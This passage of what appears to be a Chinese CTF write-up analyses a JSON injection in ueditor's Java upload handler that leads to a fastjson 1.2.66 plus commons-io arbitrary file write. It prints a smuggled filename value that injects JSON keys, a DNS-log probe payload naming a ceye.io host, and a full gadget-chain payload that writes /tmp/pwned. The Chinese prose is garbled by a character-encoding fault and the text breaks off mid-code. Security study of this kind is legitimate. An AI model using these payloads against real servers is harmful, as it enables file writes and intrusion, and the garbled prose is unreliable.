        <content type="html"><![CDATA[<blockquote><p>æ–‡ç« é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼Œ<a href="https://xz.aliyun.com/t/14462">ä¼ é€é—¨</a>ã€‚</p></blockquote><h3 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h3><p>å‰æ®µæ—¶é—´ç»™<code>venom</code>æ‹›æ–°èµ›å‡ºäº†ä¸¤é“é¢˜ï¼Œå…¶ä¸­çš„<code>java</code>é¢˜æºè‡ªå»å¹´å®¡è®¡<code>ueditor</code>æºç æ—¶å‘ç°çš„ä¸€ä¸ªå°é—®é¢˜ï¼Œæ„Ÿè§‰æœ‰å¸Œæœ›äº§å‡ºä¸€äº›æ¼æ´ï¼Œæ¥ç€æ¢ç´¢äº†ä¸€ä¸‹å‘ç°ç¡®å®æœ‰æ´ã€‚å› ä¸ºåˆ©ç”¨è¿‡ç¨‹å¤ªè¿‡<code>ctf</code>äº†ï¼Œå¹¶ä¸”ç›¸å¯¹ç®€å•æ‰€ä»¥ç†æ‰€å½“ç„¶åšæˆäº†ä¸€é“<code>ctf</code>é¢˜ç›®ã€‚</p><h3 id="ueditorçš„JSONæ³¨å…¥éšæ‚£"><a href="#ueditorçš„JSONæ³¨å…¥éšæ‚£" class="headerlink" title="ueditorçš„JSONæ³¨å…¥éšæ‚£"></a>ueditorçš„JSONæ³¨å…¥éšæ‚£</h3><h4 id="ä½ å¥½-ueditor"><a href="#ä½ å¥½-ueditor" class="headerlink" title="ä½ å¥½ ueditor"></a>ä½ å¥½ ueditor</h4><p><code>ueditor</code>åœ¨<code>2023</code>å¹´åœ¨<code>github</code>ä¸Šåœæ­¢ç»´æŠ¤ï¼Œå®é™…ä¸Šäº”å¹´å‰å°±ä¸åœ¨æ›´æ–°äº†ã€‚åœ¨<code>java</code>ç‰ˆæœ¬å½“ä¸­ï¼Œå®˜æ–¹ç»™å‡ºäº†ä¸Šä¼ æ–‡ä»¶çš„æ ‡å‡†ç”¨æ³•ï¼Œå³è°ƒç”¨<code>String json = new ActionEnter(request, rootPath).exec()</code>ï¼Œæ­£å¸¸æ¥è¯´åç«¯ç›´æ¥è¿”å›<code>json</code>å­—ç¬¦ä¸²å³å¯ã€‚</p><p>ä½†æ˜¯ï¼Œå¦‚æœå¼€å‘è€…æƒ³ä¿®æ”¹è¿”å›çš„å±æ€§ï¼ˆå¢åˆ å‡ ä¸ª<code>key</code>ï¼‰çš„è¯ï¼Œè¿˜æ˜¯ä¼šç”¨<code>JSON</code>è§£æåº“è§£æ<code>json</code>ï¼Œå¦‚æœåœ¨<code>json</code>å­—ç¬¦ä¸²ï¼ˆéƒ¨åˆ†ï¼‰å¯æ§çš„æƒ…å†µä¸‹ï¼Œæ­¤æ—¶å¯èƒ½ä¼šå‡ºç°å®‰å…¨é—®é¢˜ã€‚<del>å¤§æ¦‚æ‰«äº†ä¸€çœ¼å›½å†…çš„<code>CMS</code>å¼•å…¥<code>ueditor</code>è¿˜æŒºå¤šçš„ï¼Œå¸ˆçˆ¶ä»¬å¯ä»¥çœ‹çœ‹æœ‰å“ªäº›<code>cms</code>è°ƒç”¨äº†<code>ueditor</code>å¹¶ä¸”è¿›è¡Œä¸å®‰å…¨ç¼–ç è§„èŒƒå¯¼è‡´æ¼æ´è§¦å‘ï¼Œæ²¡å‡†èƒ½åˆ·ç‚¹<code>0day</code>ã€‚</del></p><p>å–œæå¿½ç•¥ä¸€æšï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1708169914163.png" alt="1708169914163"></p><h4 id="éšæ‚£åˆ†æ"><a href="#éšæ‚£åˆ†æ" class="headerlink" title="éšæ‚£åˆ†æ"></a>éšæ‚£åˆ†æ</h4><p>æ½œåœ¨éšæ‚£ï¼Œä¹Ÿå°±æ˜¯<code>sink</code>åœ¨<code>com.baidu.ueditor.define.BaseState#toString</code>æ–¹æ³•ä¸­ï¼Œ<code>new ActionEnter(request, rootPath).exec()</code>å®é™…ä¸Šè°ƒç”¨çš„å°±æ˜¯è¯¥æ–¹æ³•ã€‚</p><p>å…¶ä¸»è¦é€»è¾‘æ˜¯å¯¹<code>map</code>è¿›è¡Œéå†ï¼ŒæŠŠ<code>key</code>å’Œ<code>value</code>è¿›è¡Œå¤„ç†æœ€ç»ˆåˆ¶ä½œæˆ<code>JSON</code>å­—ç¬¦ä¸²å½¢å¼ã€‚<br>å…¶ä¸­<code>key</code>å’Œ<code>value</code>ç”¨<code>+</code>è¿›è¡Œæ‹¼æ¥ï¼Œå¦‚æœ<code>key</code>æˆ–<code>value</code>å¯æ§çš„è¯å¯èƒ½ä¼šå¯¼è‡´<code>json</code>æ³¨å…¥é—®é¢˜ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694866213804.jpg" alt="Alt text"></p><p>æˆ‘ä»¬æ¥æ‰¾ä¸€ä¸‹<code>key</code>æˆ–<code>value</code>æ˜¯å¦å¯æ§ï¼Œ<code>ActionEnter#invoke</code>æ–¹æ³•è°ƒç”¨äº†<code>state#toJSONString</code>,å¯ä»¥çœ‹åˆ°å½“<code>ActionMap</code>ä¸º<code>UPLOAD_FILE</code>ï¼ˆæ–‡ä»¶ä¸Šä¼ ï¼‰æ“ä½œæ—¶ä¼šè§¦å‘ <code>Uploader#doExec</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-2.png" alt="Alt text"></p><p>æ¥ç€çœ‹<code>Uploader#doExec</code>çš„é€»è¾‘ï¼Œè¿™é‡Œä¼šæ ¹æ®æ˜¯å¦<code>base64</code>è°ƒç”¨ä¸åŒç±»çš„<code>save</code>æ–¹æ³•ã€‚å½“æ“ä½œä¸º<code>UPLOAD_FILE</code>æ—¶é…ç½®ç±»<code>ConfigManager</code>çš„<code>isBase64</code>ä¸º<code>false</code>ï¼Œæ‰€ä»¥<code>Uploader#doExec</code>è§¦å‘<code>BinaryUploader#save</code>ã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">case</span> ActionMap<span class="token punctuation">.</span>UPLOAD_FILE<span class="token operator">:</span>    conf<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"isBase64"</span><span class="token punctuation">,</span> <span class="token string">"false"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    conf<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"maxSize"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>jsonConfig<span class="token punctuation">.</span><span class="token function">getLong</span><span class="token punctuation">(</span><span class="token string">"fileMaxSize"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    conf<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"allowFiles"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getArray</span><span class="token punctuation">(</span><span class="token string">"fileAllowFiles"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    conf<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"fieldName"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>jsonConfig<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"fileFieldName"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    savePath <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>jsonConfig<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"filePathFormat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-3.png" alt="Alt text"></p><p>ç»§ç»­å®¡è®¡<code>BinaryUploader#save</code>å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°<code>originFileName</code>æ˜¯ç”±ä¸Šä¼ è¡¨å•çš„<code>filename</code>æ§åˆ¶çš„ï¼Œæ‰¾åˆ°äº†å¯æ§ç‚¹ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ç¨‹åºæ ¡éªŒäº†åç¼€åï¼Œè¿™å¾ˆå¥½ç»•è¿‡ã€‚ä»¤<code>filename</code>ä¸º<code>filename=flag&quot;,&quot;vulnerable&quot;:&quot;hacked&quot;,&quot;a&quot;:&quot;.txt</code>å³å¯ç»•è¿‡æ£€æµ‹ã€‚æœ€ç»ˆä¼šæŠŠ<code>originFileName</code>æ”¾è¿›<code>BaseState</code>å½“ä¸­ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-4.png" alt="Alt text"></p><p>æ¥ç€è§¦å‘<code>toJSONString</code>é€šè¿‡æ‹¼æ¥æŠŠæ¶æ„å­—ç¬¦å¤„ç†ä¸ºå­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯å¼€å¤´æåˆ°çš„<code>sink</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694868670291.png" alt="Alt text"></p><p>å‘ç°ä»¥ä¸Šå‡½æ•°è°ƒç”¨å¯ä»¥é€šè¿‡<code>/ueditor</code>è·¯ç”±è§¦å‘ï¼Œå…¶ä¸­è¿”å›çš„<code>json</code>ä¸ºæ¶æ„å­—ç¬¦ä¸²ï¼Œæœ€ç»ˆæŠŠ<code>json</code>ä¼ ç»™äº†<code>uploadService#uploadHandle</code>ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥çœ‹çœ‹<code>uplodaHandle</code>æ–¹æ³•å¹²äº†å•¥ï¼Œä½¿å¾—ä¸€ä¸ª<code>JSON</code>æ³¨å…¥éšæ‚£æœ€ç»ˆé€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240217194225885.png" alt="image-20240217194225885"></p><h4 id="æ¼æ´è§¦å‘æ€è€ƒ"><a href="#æ¼æ´è§¦å‘æ€è€ƒ" class="headerlink" title="æ¼æ´è§¦å‘æ€è€ƒ"></a>æ¼æ´è§¦å‘æ€è€ƒ</h4><p>åˆ°ç›®å‰ä¸ºæ­¢ä»…ä»…æ˜¯å­˜åœ¨ä¸€ä¸ªéšæ‚£ï¼Œå¦‚æœå¼€å‘è€…æ²¡æœ‰è§£æ<code>JSON</code>å­—ç¬¦ä¸²é‚£ä¹ˆä¸ä¼šé€ æˆçœŸæ­£çš„å±å®³ï¼Œå½“æ—¶æƒ³åº”è¯¥æœ‰ä¸¤ä¸ªåˆ©ç”¨é¢ã€‚</p><ol><li>ç›´æ¥ä½¿ç”¨<code>fastjson#parse</code>è§£æè¯¥å­—ç¬¦ä¸²ï¼Œå€˜è‹¥<code>fj</code>çš„ç‰ˆæœ¬è¾ƒä½ï¼Œé‚£ä¹ˆå¯ä»¥<code>RCE</code>ã€‚</li><li>éœ€è¦è§‚å¯Ÿå¼€å‘è§£æå­—ç¬¦ä¸²åçš„é€»è¾‘ï¼Œæ¯”å¦‚å¼€å‘è‡ªå·±å®ç°äº†å¤‡ä»½æ–‡ä»¶çš„åŠŸèƒ½ï¼Œè€Œå¤‡ä»½æ–‡ä»¶çš„è·¯å¾„å–è‡ª<code>filepath</code>ä¹‹ç±»çš„ï¼Œæ­¤æ—¶åˆ©ç”¨<code>JSON</code>æ³¨å…¥æ³¨è¿›å»ä¸€ä¸ªåŒåå±æ€§<code>filepath</code>ï¼Œå¯èƒ½ä¼šè¦†ç›–ç‚¹åŸæœ‰çš„<code>filepath</code>ä»è€Œé€ æˆä»»æ„æ–‡ä»¶ä¸Šä¼ ã€‚</li></ol><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>å½“æ—¶ç¡®å®æ‰¾åˆ°äº†å‡ ä¸ªæ´ï¼Œå…¶ä¸­<code>star</code>æœ€å¤šçš„<code>cms</code>è¢«æˆ‘ä¿®ä¿®æ”¹æ”¹åšæˆäº†è¿™é“é¢˜ï¼Œå®é™…ä¸Šå°±æ˜¯ä½ç‰ˆæœ¬<code>fastjson</code>è§£æçš„é—®é¢˜å•¦ã€‚æ¥ä¸‹æ¥å°±å¤åˆ¶ç²˜è´´<code>wp</code>äº†ã€‚</p><p>é¢˜ç›®åªæœ‰ç™»å½•ï¼Œæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ã€‚</p><p>å…¶ä¸­<code>IndexController</code>å¤„ç†ç™»å½•é€»è¾‘ï¼Œä¸å­˜åœ¨æ³¨å…¥é—®é¢˜ã€‚</p><p><code>UploadController</code>è¦æ±‚ç™»é™†ç”¨æˆ·ä¸º<code>admin</code>æ‰èƒ½ä¸Šä¼ ï¼Œå¼±å£ä»¤<code>admin/admin</code>å³å¯ç™»å½•ã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> String <span class="token function">upload</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span> Model model<span class="token punctuation">,</span> HttpSession session<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"action"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span> String action<span class="token punctuation">)</span> <span class="token keyword">throws</span> URISyntaxException <span class="token punctuation">{</span>    String user<span class="token operator">=</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span> session<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token string">"admin"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span><span class="token string">"no way"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"upload"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>action <span class="token operator">==</span> null<span class="token punctuation">)</span><span class="token punctuation">{</span>        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span><span class="token string">"ä¼ ä¸ªæ–‡ä»¶å§"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"upload"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    String json <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActionEnter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> UploadController<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getResource</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>rootPath<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    String contextPath <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getContextPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// æ–‡ä»¶å¤„ç†</span>    String handlerOut <span class="token operator">=</span> uploadService<span class="token punctuation">.</span><span class="token function">uploadHandle</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> json<span class="token punctuation">,</span> contextPath<span class="token punctuation">)</span><span class="token punctuation">;</span>    model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span>handlerOut<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"upload"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœŸæ­£å¤„ç†æ–‡ä»¶ä¸Šä¼ é€»è¾‘åœ¨<code>new ActionEnter(request, UploadController.class.getResource(&quot;/&quot;).toURI().getPath()+rootPath).exec();</code>ï¼Œå³è°ƒç”¨äº†<code>ueditor</code>æä¾›çš„å‡½æ•°æ¥å®ç°æ–‡ä»¶ä¸Šä¼ ï¼Œè€Œ<code>UploadServiceImpl#uploadFileHandler</code>æ–¹æ³•ä»…ä»…æ˜¯å¤šåŠ äº†ä¸€ä¸ªè¿”å›å­—æ®µã€‚</p><p>æˆ‘çŒœæœ‰äº›å¸ˆå‚…çœ‹åˆ°æ–‡ä»¶ä¸Šä¼ å°±ä¼šæƒ³åˆ°ä¸Šä¼ <code>btl</code>æ¥è¦†ç›–<code>test.btl</code>ç­‰æ¨¡æ¿æ¥æ‰“æ¨¡æ¿æ³¨å…¥<code>RCE</code>ï¼Œä½†<code>ueditor</code>çš„æ–‡ä»¶ä¸Šä¼ é€»è¾‘é™åˆ¶çš„æ¯”è¾ƒæ­»ã€‚ä¸€æ–¹é¢æ˜¯é€šè¿‡<code>config.json</code>æ¥é™åˆ¶äº†æ–‡ä»¶åç¼€ï¼Œä¸èƒ½ä¸Šä¼ <code>btl</code>ï¼›å¦ä¸€æ–¹é¢ä¹Ÿæ²¡æ³•ç›®å½•ç©¿è¶Šã€‚</p><p>æ‰€ä»¥å¾ˆå¿«å°±èƒ½å‘ç°<code>UploadServiceImpl#uploadFileHandler</code>æ–¹æ³•ååˆ†å¯ç–‘ã€‚è¿™é‡Œé€šè¿‡<code>parseObject</code>å¤„ç†<code>outJsonString</code>å­—ç¬¦ä¸²ï¼Œå†çœ‹ä¸€çœ¼<code>fj</code>çš„ä¾èµ–ä¸æ˜¯æœ€æ–°çš„ï¼Œå½“æ—¶ä¹Ÿæ˜¯ç»™å‡ºäº†æç¤ºï¼Œå¾ˆæ˜æ˜¾<code>sink</code>å°±åœ¨è¿™é‡Œã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">protected</span> String <span class="token function">uploadFileHandler</span><span class="token punctuation">(</span>String outJsonString<span class="token punctuation">,</span> String contextPath<span class="token punctuation">)</span> <span class="token punctuation">{</span>    State state <span class="token operator">=</span> null<span class="token punctuation">;</span>    JSONObject json <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>outJsonString<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token string">"SUCCESS"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>json<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"state"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"error"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    json<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"author"</span><span class="token punctuation">,</span><span class="token string">"squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> state <span class="token operator">==</span> null <span class="token operator">?</span> outJsonString <span class="token operator">:</span> state<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœ<code>outJsonString</code>å¯æ§å°±å¯ä»¥åˆ©ç”¨äº†ï¼Œè€Œ<code>outJsonString</code>æ˜¯<code>ueditor</code>çš„æ–¹æ³•è¿”å›çš„å­—ç¬¦ä¸²ï¼Œéœ€è¦å®¡è®¡<code>ueditor</code>æºç ï¼Œå°±æ˜¯ä¸Šé¢é‚£ä¸€éƒ¨åˆ†ã€‚</p><h4 id="fastjson-common-ioä»»æ„æ–‡ä»¶å†™"><a href="#fastjson-common-ioä»»æ„æ–‡ä»¶å†™" class="headerlink" title="fastjson common-ioä»»æ„æ–‡ä»¶å†™"></a>fastjson common-ioä»»æ„æ–‡ä»¶å†™</h4><p><code>uploadHandle</code>é€šè¿‡<code>parseObject</code>æ–¹æ³•å¯¹æ¶æ„å­—ç¬¦ä¸²è¿›è¡Œè§£æï¼Œå¯ä»¥çœ‹åˆ°<code>json</code>å·²ç»è¢«æ±¡æŸ“äº†ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-5.png" alt="Alt text"></p><p>æœ¬é¢˜ç”¨åˆ°çš„<code>fastjson</code>ä¸º<code>1.2.66</code>ï¼Œç‰ˆæœ¬ä¸é«˜å­˜åœ¨åˆ©ç”¨çš„å¯èƒ½ã€‚è§‚å¯Ÿ<code>pom.xml</code>å‘ç°å­˜åœ¨<code>commons-io 2.7</code>ï¼ˆå¤šæä¸€å˜´<code>ueditor.jar</code>æœ¬èº«å¼•å…¥äº†<code>common-io</code>ï¼‰ã€‚ä¸éš¾æƒ³åˆ°<code>fastjson1.2.68</code>ç»“åˆ<code>common-io2.x</code>å¯ä»¥æ‰“ä¸€ä¸ªä»»æ„æ–‡ä»¶å†™å…¥ï¼Œæ„é€ åŸç†å¯ä»¥å‚è€ƒ<code>su18</code>å‘çš„åšå®¢ã€‚å€¼å¾—æ³¨æ„çš„ä¸€ç‚¹æ˜¯<code>json</code>çš„ç¬¬ä¸€ä¸ªå±æ€§<code>&quot;state&quot;:&quot;SUCCESS</code>â€œæ˜¯ä¸å¯æ§çš„ï¼Œä»¤<code>filename</code>ä¸º<code>flag&quot;,&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;bgb5eh.ceye.io&quot;&#125;,&quot;a&quot;:&quot;.txt</code>å³å¯æ­£å¸¸æ¢å¤<code>Java Bean</code>ã€‚</p><pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>  <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.input.XmlStreamReader"</span><span class="token punctuation">,</span>  <span class="token property">"is"</span><span class="token operator">:</span><span class="token punctuation">{</span>    <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.input.TeeInputStream"</span><span class="token punctuation">,</span>    <span class="token property">"input"</span><span class="token operator">:</span><span class="token punctuation">{</span>      <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.input.ReaderInputStream"</span><span class="token punctuation">,</span>      <span class="token property">"reader"</span><span class="token operator">:</span><span class="token punctuation">{</span>        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.input.CharSequenceReader"</span><span class="token punctuation">,</span>        <span class="token property">"charSequence"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.String"</span><span class="token string">"aaaaaa"</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token property">"charsetName"</span><span class="token operator">:</span><span class="token string">"UTF-8"</span><span class="token punctuation">,</span>      <span class="token property">"bufferSize"</span><span class="token operator">:</span><span class="token number">1024</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"branch"</span><span class="token operator">:</span><span class="token punctuation">{</span>      <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.output.WriterOutputStream"</span><span class="token punctuation">,</span>      <span class="token property">"writer"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.output.FileWriterWithEncoding"</span><span class="token punctuation">,</span>        <span class="token property">"file"</span><span class="token operator">:</span> <span class="token string">"/tmp/pwned"</span><span class="token punctuation">,</span>        <span class="token property">"encoding"</span><span class="token operator">:</span> <span class="token string">"UTF-8"</span><span class="token punctuation">,</span>        <span class="token property">"append"</span><span class="token operator">:</span> <span class="token boolean">false</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token property">"charset"</span><span class="token operator">:</span> <span class="token string">"UTF-8"</span><span class="token punctuation">,</span>      <span class="token property">"bufferSize"</span><span class="token operator">:</span> <span class="token number">1024</span><span class="token punctuation">,</span>      <span class="token property">"writeImmediately"</span><span class="token operator">:</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"closeBranch"</span><span class="token operator">:</span><span class="token boolean">true</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"httpContentType"</span><span class="token operator">:</span><span class="token string">"text/xml"</span><span class="token punctuation">,</span>  <span class="token property">"lenient"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span>  <span class="token property">"defaultEncoding"</span><span class="token operator">:</span><span class="token string">"UTF-8"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é™¤äº†å±æ€§å¼€å¤´çš„å‘ä¹‹å¤–è¿˜æœ‰å¥½å¤šå‘ï¼Œå®é™…ä¸Š<code>ueditor Json injection</code>é‚£é‡Œå¤§æ¦‚çœ‹äº†æ²¡å¤šä¹…å°±å®¡å‡ºæ¥äº†ï¼Œä½†æ˜¯åˆ©ç”¨å¡äº†æˆ‘ä¸€å¤©ã€‚ã€‚</p><p>ç¬¬ä¸€ç‚¹æ˜¯<code>fj</code>è°ƒç”¨æ„é€ å‡½æ•°å­˜åœ¨éšæœºæ€§ï¼Œè€Œ<code>WriterOutputStream</code>æ°å¥½æœ‰ä¸€å †å¾ˆç›¸ä¼¼çš„æ„é€ å‡½æ•°ï¼Œæ‰€ä»¥åœ¨æ„é€ çš„æ—¶å€™éœ€è¦æ³¨æ„<code>WriterOutputStream</code>æ„é€ æ–¹æ³•çš„ç¬¬äºŒä¸ªå±æ€§æ˜¯<code>charset</code>æˆ–<code>charsetName</code>ï¼Œå¦‚æœå±æ€§åç§°é”™è¯¯ä¼šæŠ¥<code>Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: create instance error, null, public</code>ã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token function">WriterOutputStream</span><span class="token punctuation">(</span>Writer writer<span class="token punctuation">,</span> Charset charset<span class="token punctuation">,</span> <span class="token keyword">int</span> bufferSize<span class="token punctuation">,</span> <span class="token keyword">boolean</span> writeImmediately<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">(</span>writer<span class="token punctuation">,</span> charset<span class="token punctuation">.</span><span class="token function">newDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">onMalformedInput</span><span class="token punctuation">(</span>CodingErrorAction<span class="token punctuation">.</span>REPLACE<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">onUnmappableCharacter</span><span class="token punctuation">(</span>CodingErrorAction<span class="token punctuation">.</span>REPLACE<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceWith</span><span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> bufferSize<span class="token punctuation">,</span> writeImmediately<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token function">WriterOutputStream</span><span class="token punctuation">(</span>Writer writer<span class="token punctuation">,</span> String charsetName<span class="token punctuation">,</span> <span class="token keyword">int</span> bufferSize<span class="token punctuation">,</span> <span class="token keyword">boolean</span> writeImmediately<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">(</span>writer<span class="token punctuation">,</span> Charset<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>charsetName<span class="token punctuation">)</span><span class="token punctuation">,</span> bufferSize<span class="token punctuation">,</span> writeImmediately<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" 